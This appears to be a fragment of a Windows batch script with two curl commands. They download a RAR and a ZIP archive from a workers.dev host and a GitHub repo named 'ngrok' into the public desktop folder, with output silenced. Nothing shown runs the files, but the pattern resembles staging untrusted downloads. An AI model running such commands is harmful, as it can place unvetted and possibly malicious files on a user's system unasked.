...
curl -o "C:\Users\Public\Desktop\estyak.rar" https://dcunningham.rahim56-ekra.workers.dev/0:/pythonairamirror/Estyak%20for%20prd.rar > out.txt 2>&1
curl -o "C:\Users\Public\Desktop\megadownloader 1.8.zip" https://github.com/ealeech/ngrok/raw/main/megadownloader%201.8.zip > out.txt 2>&1
